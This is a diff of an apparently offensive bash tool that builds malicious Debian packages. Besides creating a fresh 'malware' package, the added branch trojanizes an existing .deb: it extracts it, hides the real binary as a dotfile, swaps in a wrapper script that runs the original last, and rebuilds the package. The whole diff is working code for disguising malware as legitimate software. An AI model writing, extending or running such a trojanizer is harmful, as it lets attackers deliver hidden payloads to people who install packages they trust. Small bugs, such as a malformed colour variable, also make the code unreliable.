@@ -1,4 +1,7 @@
 # Create a Debpackage
+
+
+source ${PWD}/misc/malware.sh
 control(){
     while read line;do
 	$line
@@ -13,16 +16,21 @@ EOF
 
 
 createMalDeb() {
-    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" \
+    while printf "\n${open}${light}${green}Create a new %s package for the Malware?[y|n]: ${close}" \
 		 "${pPackage}"; \
 	  read $opt -e inmissile
     do
+	printf "\n"
+       
 	case $inmissile in
-	    y|Y)	dirfile="${0##*/}${SPID}"
-			echo ""
-			printf "${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
-			mkdir "$dirfile"
-			cd "$_" 
+	    y|Y)	malwareDir="malware"
+
+			printf "\n${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
+			
+			mkdir "$malwareDir"
+			
+			cd "$_"
+			
 			mkdir -p usr/local/bin && mkdir DEBIAN
 			cd usr/local/bin
 			
@@ -30,9 +38,11 @@ createMalDeb() {
 			packagedetails
 			cd ../../../../
 			
-			mv "${dirfile}" "${fileName}$vnum$vnumber"
+			mv "${malwareDir}" "${fileName}$vnum$vnumber"
 			cd "$(pwd)/${fileName}$vnum$vnumber/usr/local/bin/"
-			#mv ./* "${CUT_SHIT}"
+			
+
+			
 			cd ../../../../
 			control
 			dpkg-deb --build "${fileName}$vnum$vnumber" &>/dev/null &
@@ -52,6 +62,53 @@ createMalDeb() {
 			rm -rf "${fileName}$vnum$vnumber"
 			break
 			;;
+	    n|N)
+		while :;do
+		    printf "${open}${bold}${green}%s${close}" "Specify the package to attach malware too: " ; read -e attachToPackage
+		    printf "\n"
+		    [[ -z "${attachToPackage}" ]] && continue # Check if attachToPackage is null
+		    
+		    # The file command will show you the type of file $attachToPackage is
+		    local checkIfDeb=$(file $attachToPackage)  
+
+		    if [[ "${checkIfDeb}" =~ "Debian binary package" ]];then
+
+			dpkg -x "${attachToPackage}" .  # Extract the debian pacakage in the current directory
+
+			# extract the name of the pacakge
+			packageName="${attachToPackage%%_*}"
+			
+			# move into the /usr/bin folder of the package
+			
+			if [[ -d "${PWD}/usr/bin/" ]];then
+			    cd "${PWD}/usr/bin/"
+			    dirfile="tempScript.sh"
+
+			    # rename the packageName tto a . file so it will be hidden
+			    mv "${packageName}" ".${packageName}"
+			    # Put the package name in the last end of the script
+			    
+			    echo "/usr/bin/.${packageName}" >> "${dirfile}"
+			    chk_file
+			    mv ${dirfile%%.*} "${packageName}"
+			    cd -
+			    dpkg --build usr
+			fi
+
+			
+			printf "${open}${bold}${yellow}%s{close}\n" "[!]${attachToPackage} does not have a usr/bin directory"
+			exit 2
+			    
+			
+			
+		    fi
+		    
+		    printf "${open}${bold}${yellow}%s${close}\n" "[!]${attachToPackage} is not a debian package"
+		    
+		    continue ;
+		done
+		      
+		;;
 	    *)
 		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
 	esac
